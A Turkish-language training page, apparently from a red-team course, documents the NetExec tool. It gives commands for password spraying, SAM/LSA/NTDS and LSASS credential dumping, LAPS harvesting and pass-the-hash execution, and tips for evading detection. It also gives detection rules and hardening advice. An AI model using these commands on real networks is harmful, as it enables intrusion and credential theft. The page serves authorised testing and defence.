# NetExec (nxc)

> **Kategori:** [11. YANAL HAREKET VE UZAK KOD YÜRÜTME (LATERAL MOVEMENT & EXECUTION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** CrackMapExec'in modern topluluk ardılı olan; SMB, WinRM, LDAP, MSSQL, RDP, SSH ve FTP protokolleri üzerinden parola püskürtme (spray), kimlik doğrulama, komut yürütme, LAPS/SAM/LSA/NTDS dökümü ve zengin modül mimarisi (spider_plus, lsassy, nanodump) sunan çok protokollü ağ sömürü motoru.

---

## 1. Genel Bakış ve Amaç

NetExec (eski adıyla CrackMapExec - CME), Active Directory etki alanlarında ve kurumsal yerel ağlarda keşif, kimlik doğrulama testi, parola püskürtme, yetki tespiti ve yanal hareket (lateral movement) operasyonlarını otomatikleştirmek amacıyla geliştirilmiş yüksek performanslı bir ağ sömürü ve denetim aracıdır.

NetExec, geleneksel tekil saldırı araçlarının aksine çok iş parçacıklı (multi-threaded) bir mimariye ve çoklu protokol desteğine (SMB, WinRM, LDAP, MSSQL, RDP, SSH, FTP, VNC) sahiptir. Bir alt ağdaki yüzlerce bilgisayara aynı anda bağlanarak eldeki kimlik bilgilerini (kullanıcı adı/parola, NTLM hash veya Kerberos bileti) test eder. Başarılı kimlik doğrulamalarında kullanıcının hedef makinede yerel yönetici (Local Administrator) hakkı bulunup bulunmadığını anında `(Pwn3d!)` etiketiyle operatöre bildirir.

NetExec'in gücü, genişletilebilir modül ekosisteminden (`-M`) ve dahili SQLite veritabanından (`~/.nxc/workspaces/`) kaynaklanır. Operasyon sırasında keşfedilen tüm canlı ana makineler, açık portlar, etki alanı kullanıcıları, ele geçirilen parolalar/hash'ler ve ağ paylaşımları merkezi veritabanında indekslenir.

```
+-------------------------------------------------------------------------+
|                          NetExec Mimari Akışı                          |
+-------------------------------------------------------------------------+
                               |
               Operatör Girdisi (CLI / Targets / CIDR)
              [nxc smb 192.168.1.0/24 -u user -p pass]
                               v
                     +--------------------+
                     |   NetExec Core     |
                     | (Multi-Threaded)   |
                     +--------------------+
                       /   |      |     \
         SMB (445)    /    |      |      \  WinRM (5985)
         LDAP (389)  /     |      |       \ MSSQL (1433)
                    v      v      v        v
              +----------++---------++----------++----------+
              | Target01 || Target02|| Target03 || Target04 |
              +----------++---------++----------++----------+
                    |          |          |           |
             Authentication & Access Validation Protocol
                    \          |          /           /
                     v         v         v           v
         +-------------------------------------------------+
         |            Sonuç ve Yetki Analizi               |
         |  [+] 192.168.1.10:445  CORP\jdoe:Pass123        |
         |  [+] 192.168.1.15:445  CORP\jdoe:Pass123 (Pwn3d!)|
         +-------------------------------------------------+
                               |
            +------------------+------------------+
            |                                     |
 1. Yürütme Motoru (--exec-method)       2. Modül Ekosistemi (-M)
    - wmiexec (DCOM / RPC 135)              - lsassy (LSASS dökümü)
    - smbexec (Named Pipe / Service)        - spider_plus (Share analizi)
    - atexec  (Task Scheduler RPC)          - laps (LAPS parola çekme)
    - mmcexec (DCOM MMC20)                  - nanodump (EDR-Safe Dump)
            |                                     |
            v                                     v
   [SYSTEM / Admin Kabuğu]               [Veritabanı / Kimlikler]
```

### 1.1 NetExec vs CrackMapExec
NetExec, CrackMapExec projesinin geliştirilmesinin durdurulmasının ardından topluluk tarafından devralınan resmi ardıldır:
* **Güncel Protokol Kütüphaneleri:** Impacket ve Cryptography kütüphanelerinin en güncel sürümleriyle tam uyumlu çalışır.
* **Gelişmiş RDP ve MSSQL Desteği:** RDP üzerinden ekran görüntüsü alma, NLA doğrulama ve MSSQL üzerinde daha kararlı T-SQL/xp_cmdshell desteği.
* **Modern EDR Atlatma Modülleri:** `nanodump`, `procdump`, `lsassy` modülleri ile bellekten kimlik bilgisi toplarken EDR alarmlarını minimize eden gelişmiş yöntemler.
* **Daha Hızlı Veritabanı:** SQLite tabanlı çalışma alanı (workspace) yönetimi optimize edilmiştir.

### 1.2 Dahili SQLite Veritabanı ve Çalışma Alanı Mimarisi (nxc-db)
NetExec, yürütülen tüm taramaların sonuçlarını yerel disk üzerindeki SQLite veritabanlarında (`~/.nxc/workspaces/<workspace_adı>/`) saklar:
* **Çalışma Alanı İzolasyonu:** Farklı projeler veya ağ segmentleri için `--workspace <ad>` bayrağı ile bağımsız veritabanları oluşturulabilir.
* **`nxc-db` Yönetim Aracı:** Komut satırından `nxc-db` çağrılarak ele geçirilen tüm kimlik bilgileri (`creds`), doğrulanmış etki alanı kullanıcıları, yerel yönetici ayrıcalığı elde edilen bilgisayarlar (`hosts -u`) ve erişilebilir paylaşımlar (`shares`) filtrelenebilir.
* **Otomatik Kimlik Yeniden Kullanımı (Credential Replay):** Veritabanında biriken hash ve parolalar, tek bir komutla yeni keşfedilen alt ağlara karşı otomatik olarak yeniden denenebilir (credential replay).

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Hızlı Parola Püskürtme (Spray)** | Etki alanında hesap kilitleme eşiklerine (Account Lockout Threshold) takılmadan tek bir parolayı yüzlerce kullanıcıda test etme. |
| **Yönetici Ayrıcalığı Doğrulama** | Hangi makinelerde yerel yönetici (`Pwn3d!`) olunduğunu saniyeler içinde tespit ederek yanal hareket hedefi belirleme. |
| **LAPS Parolalarının Çekilmesi** | Active Directory'de `ms-Mcs-AdmPwd` veya Windows LAPS özniteliklerini LDAP üzerinden tek komutla toplama. |
| **İkili Bırakmadan Komut Yürütme** | `wmiexec`, `smbexec` veya `atexec` yöntemleriyle hedef makinede dosyasız uzaktan kod koşturma. |
| **Ağ Paylaşımlarının İndekslenmesi** | `spider_plus` modülü ile tüm paylaşımlardaki dosya yapısını JSON olarak çıkarıp açık şifreleri otomatik arama. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | NetExec (nxc) | Metasploit (psexec) | Impacket (wmiexec/psexec) | Evil-WinRM |
|---|---|---|---|---|
| **Çoklu Hedef (CIDR Tarama)** | Mükemmel (Doğal CIDR & IP listesi) | Modül bazlı / Yavaş | Tekil hedef odaklı | Tekil hedef odaklı |
| **Protokol Çeşitliliği** | SMB, WinRM, LDAP, MSSQL, RDP, SSH | Çoklu | SMB, WMI, MSSQL (Ayrı scriptler) | Yalnızca WinRM |
| **Dahili Kimlik Veritabanı** | Evet (`nxc-db` / SQLite) | Evet (PostgreSQL) | Yok | Yok |
| **Parola Püskürtme Koruması**| Gelişmiş (`--jitter`, `--delay`) | Manuel yapılandırma | Yok | Yok |
| **Modül Ekosistemi** | Çok Geniş (30+ dinamik modül) | Post-exploitation modülleri | Yok | Dahili script yükleme |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

NetExec, protokol bazlı bir komut satırı yapısı kullanır. Komutlar her zaman hedef protokol adıyla başlar.

### Genel Sözdizimi
```bash
nxc <protokol> <hedef(ler)> [Kimlik Bilgisi] [Eylemler/Modüller]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Hedef | `<IP/CIDR/Dosya>` | Tek IP, CIDR bloğu, FQDN veya hedefleri içeren metin dosyası. | `192.168.1.0/24` veya `targets.txt` |
| Kullanıcı Adı | `-u`, `--user` | Kullanıcı adı veya kullanıcı listesi dosyası. Boş oturum için `""`. | `-u jdoe` veya `-u users.txt` |
| Parola | `-p`, `--password` | Açık metin parola veya parola listesi dosyası. | `-p Password123!` veya `-p pass.txt` |
| NTLM Hash | `-H`, `--hash` | Pass-the-Hash için kullanılacak NTLM özeti (`LM:NT` veya `:NT`). | `-H :51a26b735c02dcda...` |
| Kerberos Bilet | `-k`, `--kerberos` | Kerberos kimlik doğrulaması kullanır (`KRB5CCNAME`). | *Argümansız bayrak* |
| Yerel Kimlik | `--local-auth` | Etki alanı yerine hedef makinenin yerel SAM veritabanını sorgular. | *Argümansız bayrak* |
| Komut Yürütme | `-x`, `--execute` | `cmd.exe` üzerinden komut çalıştırır. | `-x "whoami /all"` |
| PowerShell Komutu | `-X`, `--ps-execute` | `powershell.exe` üzerinden komut çalıştırır. | `-X "Get-Process"` |
| Yürütme Yöntemi | `--exec-method` | Kod çalıştırma motoru (`wmiexec`, `smbexec`, `atexec`, `mmcexec`). | `--exec-method wmiexec` |
| LAPS Hasadı | `--laps` | Bilgisayarların LAPS yerel yönetici parolalarını LDAP'tan çeker. | *Argümansız bayrak* |
| SAM Dökümü | `--sam` | Yerel SAM veritabanındaki NTLM hash'lerini çeker (Yerel admin gerekir). | *Argümansız bayrak* |
| LSA Sırları | `--lsa` | LSA Secrets (DPAPI anahtarları, servis hesapları) dökümünü alır. | *Argümansız bayrak* |
| NTDS.dit Dökümü | `--ntds` | DC üzerinde DRSUAPI / VSS ile etki alanı parola özetlerini döker. | *Argümansız bayrak* |
| Paylaşım Listesi | `--shares` | SMB paylaşımlarını ve okuma/yazma izinlerini listeler. | *Argümansız bayrak* |
| Modül Seçimi | `-M`, `--module` | Çalıştırılacak ek modülü belirtir. | `-M lsassy` veya `-M spider_plus` |
| Modül Seçenekleri | `-o` | Seçilen modüle özel argümanları aktarır. | `-o READ_ONLY=false` |
| İş Parçacığı | `-t`, `--threads` | Eşzamanlı ağ bağlantısı sayısı (Varsayılan 100). | `-t 20` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: C Sınıfı Alt Ağda Parola Püskürtme (Password Spraying)
Etki alanındaki tüm makinelerde belirli bir parolayı test ederek hesap kilitleme riskini azaltmak amacıyla aralıklı püskürtme yürütme ve `Pwn3d!` olan sistemleri belirleme.

```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Autumn2026!' --continue-on-success
```

**Örnek Konsol Çıktısı:**
```text
SMB         192.168.1.10    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB         192.168.1.15    445    FS01             [*] Windows 10.0 Build 19041 x64 (name:FS01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         192.168.1.10    445    DC01             [-] corp.local\jsmith:Autumn2026! STATUS_LOGON_FAILURE
SMB         192.168.1.15    445    FS01             [+] corp.local\jdoe:Autumn2026! (Pwn3d!)
SMB         192.168.1.20    445    WS-HR01          [+] corp.local\jdoe:Autumn2026! 
[+] NetExec: 1 hosts pwned, 2 successful authentications logged to database.
```

### Senaryo 2: Yerel Admin ile SAM ve LSA Sırlarını Uzaktan Çekme
Yerel yönetici ayrıcalığı elde edilen bir sunucudan yerel SAM ve LSA bellek alanını çekerek yeni hash'ler elde etme.

```bash
nxc smb 192.168.1.15 -u jdoe -p 'Autumn2026!' --sam --lsa
```

### Senaryo 3: EDR-Safe lsassy Modülü ile LSASS Belleğinden Kimlik Bilgisi Avı
Hedef makinede LSASS sürecini doğrudan dump etmek yerine RPC tabanlı `lsassy` modülünü çalıştırarak aktif oturum parolalarını ve biletleri çekme.

```bash
nxc smb 192.168.1.15 -u Administrator -H :31d6cfe0d16ae931b73c59d7e0c089c0 -M lsassy
```

### Senaryo 4: LDAP Protokolü ile Etki Alanı Genelinde LAPS Parolalarını Toplama
Etki alanı kullanıcısı ile LDAP sorgusu atarak makinelerin LAPS yerel yönetici parolalarını tek tabloda toplama.

```bash
nxc ldap dc01.corp.local -u jdoe -p 'Autumn2026!' --laps
```

### Senaryo 5: spider_plus Modülü ile Ağ Paylaşımlarında Hassas Dosya Taraması
SMB paylaşımlarını özyinelemeli olarak indeksleyip boyut ve uzantı filtreleriyle JSON raporu oluşturma.

```bash
nxc smb 192.168.1.15 -u jdoe -p 'Autumn2026!' -M spider_plus -o OUTPUT_FOLDER=/tmp/nxc_spider
```

### Senaryo 6: WinRM Protokolü Üzerinden Pass-the-Hash ile Komut Yürütme
SMB portu (445) kapalı olan ancak WinRM (5985) açık olan bir sunucuda NTLM hash'i ile PowerShell komutu çalıştırma.

```bash
nxc winrm 192.168.1.25 -u Administrator -H :51a26b735c02dcda234b21651d30f7b1 -X '$PSVersionTable'
```

### Senaryo 7: wmiexec Yürütme Yöntemi ile Dosyasız Komut Koşturma
Servis oluşturmaktan (`smbexec`/`psexec`) kaçınarak DCOM WMI üzerinden sessizce komut çalıştırma.

```bash
nxc smb 192.168.1.15 -u Administrator -p 'Password123!' --exec-method wmiexec -x "whoami /priv"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_LOGON_FAILURE` | Kullanıcı adı veya parola hatalı; hesap kilitli veya süresi dolmuş olabilir. | Kimlik bilgilerini doğrulayın; hesap kilitleme riskine karşı `--continue-on-success` ile devam edin. |
| `STATUS_ACCOUNT_LOCKED_OUT` | Parola püskürtme sırasında hesap kilitleme eşiği aşılmış. | Püskürtmeyi derhal durdurun; `--jitter` ve `--delay` parametreleri ile istekler arasına bekleme süresi koyun. |
| `STATUS_ACCESS_DENIED on --sam / --lsa` | Kullanıcı kimliği doğrulanmış ancak yerel yönetici (`Pwn3d!`) yetkisi bulunmuyor veya UAC kısıtlaması etkin. | Kullanıcının yerel yönetici grubunda olduğundan emin olun; yerel hesap ise `LocalAccountTokenFilterPolicy` kısıtlamasını inceleyin. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN on Kerberos` | Hedef makinenin SPN'i DNS veya Active Directory veritabanında çözümlenemiyor. | Hedefi IP adresi yerine FQDN (`FS01.corp.local`) olarak belirtin ve `/etc/resolv.conf` ayarlarını kontrol edin. |
| `SMB SessionError: STATUS_PIPE_NOT_AVAILABLE (wmiexec/smbexec)` | Hedef sunucuda uzaktan yönetim servisleri (RPC/WMI veya SMB Named Pipes) güvenlik duvarıyla engelleniyor. | `--exec-method atexec` veya `--exec-method mmcexec` alternatif yürütme yöntemlerini deneyin. |
| `DatabaseLockedException: database is locked` | Birden fazla NetExec oturumu aynı SQLite veritabanı dosyasını (`~/.nxc/workspaces/`) kilitlemiş. | Çalışan diğer nxc süreçlerini sonlandırın veya `--workspace <YENI_IS_ALANI>` ile izole bir çalışma alanı açın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

NetExec, çok sayıda hedefe peş peşe kimlik doğrulama istekleri gönderdiği için SIEM korelasyonlarında ve ağ izleme araçlarında belirgin trafik sıçramalarına neden olur.

```
[NetExec Çalıştırması]
          │
          ├──> Çoklu Kimlik Denemesi ───────────> Event ID 4625 (Failed Logon)
          │                                      Event ID 4624 (Logon Type 3 / Network)
          │
          ├──> Yönetici Oturumu (Pwn3d!) ────────> Event ID 4672 (Special Privileges Assigned)
          │
          ├──> Yürütme Motoru (smbexec) ─────────> Event ID 7045 (New Service Installed)
          │                                      Sysmon Event ID 1 (cmd.exe /Q /c ...)
          │
          └──> LSA / SAM / NTDS Hasadı ──────────> Event ID 4656 / 4663 (Security Handle Request)
                                                 Sysmon Event ID 10 (ProcessAccess to lsass.exe)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Security Event ID 4624 (Logon Type 3):** Ağ oturumu açma kaydı. NTLMv2 kimlik doğrulamalarında istemci iş istasyonu adı `WorkstationName` olarak loglanır.
* **Security Event ID 4625 (Logon Failure):** Parola püskürtme sırasında başarısız olan tüm denemeler SubStatus koduyla (`0xC000006A`: Bad Password) günlüğe düşer.
* **Security Event ID 4672 (Special Privileges Assigned to New Logon):** Yerel yönetici oturumu açıldığında `SeDebugPrivilege`, `SeBackupPrivilege` gibi hakların atandığını gösterir.
* **Security Event ID 7045 (Service Creation):** `--exec-method smbexec` kullanıldığında rastgele 8 karakterli bir servis oluşturulur (`BAK_...`).
* **Sysmon Event ID 1 (Process Creation):** `wmiexec` kullanıldığında `WmiPrvSE.exe` -> `cmd.exe /Q /c ...` süreç ağacı EDR tarafından izlenir.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Credential Access** | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Password Spraying | Çoklu hedeflere tek parola ile püskürtme gerçekleştirme. |
| **Credential Access** | [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | SAM Database | `--sam` bayrağı ile yerel hash dökümü alma. |
| **Credential Access** | [T1003.003](https://attack.mitre.org/techniques/T1003/003/) | LSA Secrets | `--lsa` ile servis ve sistem sırlarını toplama. |
| **Execution** | [T1047](https://attack.mitre.org/techniques/T1047/) | Windows Management Instrumentation | `--exec-method wmiexec` ile dosyasız komut yürütme. |
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | SMB protokolü üzerinden yanal sıçrama. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **Hesap Kilitleme Alarmı** | Eşzamanlı çok sayıda yanlış parola gönderilmesi. | LDAP üzerinden `Get-ADDefaultDomainPasswordPolicy` ile kilitleme eşiğini öğrenin; parola başına en az 30 dakika bekleyin. |
| **smbexec Servis İzi** | Windows Servis Yöneticisine (SCM) rastgele servis ikilisi veya komut yazılması (Event ID 7045). | Servis kuran `smbexec` yerine dosyasız `wmiexec` veya `mmcexec` yürütme yöntemlerini tercih edin. |
| **Ağ Anomali Tespiti** | 100 iş parçacığıyla (`-t 100`) tüm C sınıfı ağa anında SMB bağlantısı açılması. | İş parçacığı sayısını düşürün (`-t 5`), `--jitter` ile istekler arasına rastgele gecikmeler ekleyin. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (High Volume of Failed Network Logons - Password Spraying)
```yaml
title: Potential Password Spraying via NetExec / CrackMapExec
id: e3b2a1c0-5432-8765-ba98-fedcba123456
status: production
description: Tek bir IP adresinden kısa süre içerisinde çok sayıda farklı kullanıcı adına yönelik başarısız SMB ağ oturumu (Logon Type 3) tespit edildi.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
    LogonType: 3
    Status: '0xC000006A' # Bad Password
  timeframe: 2m
  condition: selection | count(TargetUserName) by IpAddress > 15
falsepositives:
  - Hatalı yapılandırılmış merkezi servis veya envanter tarayıcıları
level: high
```

#### Microsoft Sentinel KQL Sorgusu
```kql
SecurityEvent
| where EventID == 4625
| where LogonType == 3
| summarize FailedLogons = count(), TargetUsers = make_set(TargetUserName, 50) by IpAddress, bin(TimeGenerated, 5m)
| where FailedLogons > 10
| order by FailedLogons desc
```

#### YARA Kuralı
```yara
rule NetExec_Tool_Artifacts {
    meta:
        description = "NetExec (nxc) Python araç kalıntıları ve betik tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/Pennyw1se/NetExec"
    strings:
        $s1 = "NetExec" ascii wide nocase
        $s2 = "Pwn3d!" ascii wide
        $s3 = "nxc_db" ascii wide
        $s4 = "spider_plus" ascii wide
        $s5 = "lsassy" ascii wide
    condition:
        3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **Hesap Kilitleme Politikası ve İnce Ayar (Lockout Policy):** Parola püskürtme saldırılarına karşı `Account lockout threshold` (örn: 5 deneme) ve `Account lockout duration` politikaları aktif edilmeli; ancak DoS riskine karşı Smart Lockout yapılandırılmalıdır.
* **SMB İmzalama (SMB Signing) Zorunluluğu:** Tüm sunucu ve iş istasyonlarında SMB imzalama zorunlu tutularak NTLM relay saldırıları engellenmelidir.
* **Yerel Yönetici Şifre Çözümü (LAPS / Windows LAPS):** Tüm iş istasyonları ve sunucularda her makineye özel rastgele yerel yönetici parolası atanarak tek bir parolanın ağ genelinde yanal yayılmada kullanılması önlenmelidir.
* **UAC Uzaktan Kısıtlamaları (Remote UAC):** `LocalAccountTokenFilterPolicy` kayıt defteri anahtarı `0` (varsayılan) bırakılarak etki alanı üyesi olmayan yerel hesapların ağ üzerinden `Administrator` ayrıcalıklarıyla oturum açması sınırlandırılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Alt Ağda Parola Püskürtme ve Pwn3d Tespiti
nxc smb 192.168.1.0/24 -u users.txt -p 'Spring2026!' --continue-on-success

# 2. Yerel Admin ile SAM Veritabanındaki Hash'leri Dökme
nxc smb 192.168.1.15 -u Administrator -p 'AdminPass!' --local-auth --sam

# 3. LSA Secrets (Servis Hesapları ve DPAPI) Çekme
nxc smb 192.168.1.15 -u Administrator -H :31d6cfe0d16ae931b73c59d7e0c089c0 --lsa

# 4. LDAP Üzerinden Etki Alanı LAPS Parolalarını Toplama
nxc ldap 192.168.1.10 -u jdoe -p 'Pass123!' --laps

# 5. Dosyasız wmiexec ile İşletim Sistemi Komutu Yürütme
nxc smb 192.168.1.15 -u Administrator -p 'AdminPass!' --exec-method wmiexec -x "whoami /all"

# 6. WinRM Protokolü ile Pass-the-Hash Komut Çalıştırma
nxc winrm 192.168.1.20 -u admin -H :51a26b735c02dcda234b21651d30f7b1 -X '$env:COMPUTERNAME'

# 7. spider_plus Modülü ile Ağ Paylaşımlarında Sır ve Dosya Avı
nxc smb 192.168.1.15 -u jdoe -p 'Pass123!' -M spider_plus -o OUTPUT_FOLDER=/tmp/shares

# 8. EDR-Safe lsassy Modülü ile LSASS Belleğinden Kimlik Bilgisi Toplama
nxc smb 192.168.1.15 -u Administrator -p 'AdminPass!' -M lsassy

# 9. Etki Alanı Denetleyicisinden NTDS.dit Parola Özetlerini Çekme (DRSUAPI)
nxc smb 192.168.1.10 -u da_admin -p 'SuperSecret!' --ntds drsuapi

# 10. Kerberos Bileti (.ccache) ile Parolasız SMB Taraması
export KRB5CCNAME=/tmp/ticket.ccache && nxc smb targets.txt -k --shares
```

### Komut Detay Analizleri

#### 1. Alt Ağda Parola Püskürtme ve Pwn3d Tespiti
* **Ne Yapar?:** Belirtilen C sınıfı alt ağdaki tüm aktif makinelere listedeki kullanıcı adları ve tek bir parola ile SMB oturumu açmayı dener. Yerel yönetici haklarına sahip olunan sistemleri `(Pwn3d!)` olarak işaretler.
* **Ne Zaman Kullanılır?:** Operasyonun ilk aşamasında geçerli kimlik bilgilerini ve yönetici olunan makineleri hızlıca haritalandırmak için.
* **Parametreler:**
  * `192.168.1.0/24`: Hedef CIDR alt ağı.
  * `-u users.txt`: Kullanıcı adı listesi dosyası.
  * `-p 'Spring2026!'`: Püskürtülecek tekil parola.
  * `--continue-on-success`: Başarılı bir oturum açılsa bile diğer kullanıcıları denemeye devam eder.

#### 2. Yerel Admin ile SAM Veritabanındaki Hash'leri Dökme
* **Ne Yapar?:** Hedef makinenin yerel SAM kayıt defteri kovanını uzaktan okuyarak yerel kullanıcı hesaplarının NTLM özetlerini ekrana basar ve veritabanına kaydeder.
* **Ne Zaman Kullanılır?:** Yerel yönetici yetkisi elde edilen bir makineden diğer yerel hesapların parolalarını çekmek için.
* **Parametreler:**
  * `--local-auth`: Kimlik doğrulamasının etki alanı yerine yerel SAM'e yapılacağını belirtir.
  * `--sam`: SAM dökümü alma bayrağı.

#### 3. LSA Secrets (Servis Hesapları ve DPAPI) Çekme
* **Ne Yapar?:** Hedef makinenin LSA kayıt defterinde saklanan açık metin servis hesabı parolalarını, zamanlanmış görev kimlik bilgilerini ve DPAPI anahtarlarını çıkarır.
* **Ne Zaman Kullanılır?:** Hedef sunucuda çalışan arka plan servislerinin yüksek yetkili hesap bilgilerini ele geçirmek için.
* **Parametreler:**
  * `-H :...`: Pass-the-Hash yöntemiyle kimlik doğrulama.
  * `--lsa`: LSA sırları döküm bayrağı.

#### 4. LDAP Üzerinden Etki Alanı LAPS Parolalarını Toplama
* **Ne Yapar?:** Etki Alanı Denetleyicisine LDAP protokolüyle bağlanarak okuma yetkisi bulunan tüm bilgisayarların LAPS yerel yönetici parolalarını toplar.
* **Ne Zaman Kullanılır?:** Standart bir etki alanı kullanıcısıyla tüm uç noktaların yerel yönetici parolalarını tek adımda elde etmek için.
* **Parametreler:**
  * `ldap`: LDAP protokol motorunu seçer.
  * `--laps`: LAPS özniteliklerini (`ms-Mcs-AdmPwd`) sorgular.

#### 5. Dosyasız wmiexec ile İşletim Sistemi Komutu Yürütme
* **Ne Yapar?:** DCOM WMI (`Win32_Process`) arayüzünü kullanarak diske servis ikilisi yazmadan hedef makinede komut koşturur ve çıktısını SMB pipe üzerinden çeker.
* **Ne Zaman Kullanılır?:** Servis oluşturma alarmlarını tetiklemeden sessiz komut çalıştırmak istendiğinde.
* **Parametreler:**
  * `--exec-method wmiexec`: Kod yürütme yöntemi olarak WMI DCOM'u seçer.
  * `-x "..."`: Yürütülecek işletim sistemi komutu.

#### 6. WinRM Protokolü ile Pass-the-Hash Komut Çalıştırma
* **Ne Yapar?:** TCP 5985 portu üzerinden Windows Remote Management protokolüyle NTLM hash kullanarak PowerShell oturumu açar ve komutu icra eder.
* **Ne Zaman Kullanılır?:** SMB portunun güvenlik duvarı ile engellendiği ancak WinRM'in açık olduğu sunucularda yanal hareket için.
* **Parametreler:**
  * `winrm`: WinRM protokol motoru.
  * `-X "..."`: PowerShell motoru üzerinden kod çalıştırma.

#### 7. spider_plus Modülü ile Ağ Paylaşımlarında Sır ve Dosya Avı
* **Ne Yapar?:** Erişilebilir tüm SMB paylaşımlarını özyinelemeli tarar; dosya listesini JSON olarak kaydeder ve parola içeren dosyaları raporlar.
* **Ne Zaman Kullanılır?:** Manuel dosya aramak yerine tüm paylaşım haritasını hızlıca indekslemek için.
* **Parametreler:**
  * `-M spider_plus`: Paylaşım örümcek modülü.
  * `-o OUTPUT_FOLDER=...`: Raporun yazılacağı yerel klasör.

#### 8. EDR-Safe lsassy Modülü ile LSASS Belleğinden Kimlik Bilgisi Toplama
* **Ne Yapar?:** RPC fonksiyonlarını kullanarak LSASS sürecini diske tam dump yazmadan uzaktan okur ve bellekteki açık parolaları/hash'leri çeker.
* **Ne Zaman Kullanılır?:** Standart Mimikatz çalıştırmalarının engellendiği EDR korumalı sistemlerde bellekten kimlik avlamak için.
* **Parametreler:**
  * `-M lsassy`: LSASS bellek ayrıştırma modülü.

#### 9. Etki Alanı Denetleyicisinden NTDS.dit Parola Özetlerini Çekme (DRSUAPI)
* **Ne Yapar?:** Etki alanı yöneticisi yetkisiyle DC'ye bağlanır ve DRSUAPI protokolü (DCSync benzeri) ile etki alanındaki tüm kullanıcıların NTLM hash'lerini çeker.
* **Ne Zaman Kullanılır?:** Etki alanı hakimiyeti (Domain Compromise) sağlandıktan sonra tam parola dökümü almak için.
* **Parametreler:**
  * `--ntds drsuapi`: DRSUAPI replikasyon protokolü ile NTDS dökümü.

#### 10. Kerberos Bileti (.ccache) ile Parolasız SMB Taraması
* **Ne Yapar?:** Linux bilet önbelleğindeki Kerberos biletini kullanarak NTLM kullanmadan tamamen Kerberos üzerinden hedef listesini tarar ve paylaşımları döker.
* **Ne Zaman Kullanılır?:** NTLM trafiğinin kesin olarak yasaklandığı veya izlendiği sıkılaştırılmış ortamlarda.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulamasını zorlar.
  * `--shares`: Paylaşımları listeler.

---

## Kaynaklar
* [NetExec Resmi GitHub Deposu](https://github.com/Pennyw1se/NetExec)
* [NetExec Resmi Dokümantasyonu (GitBook)](https://www.netexec.wiki/)
* [MITRE ATT&CK: Password Spraying (T1110.003)](https://attack.mitre.org/techniques/T1110/003/)
* [MITRE ATT&CK: SMB/Windows Admin Shares (T1021.002)](https://attack.mitre.org/techniques/T1021/002/)

---

> **Önceki:** [← MalSCCM (Kategori 10)](../Kategori_10_Kurumsal_Altyapi_Paylasim_ve_Veri_Avi/MalSCCM.md) · **Sonraki:** [impacket-psexec →](./impacket-psexec.md)
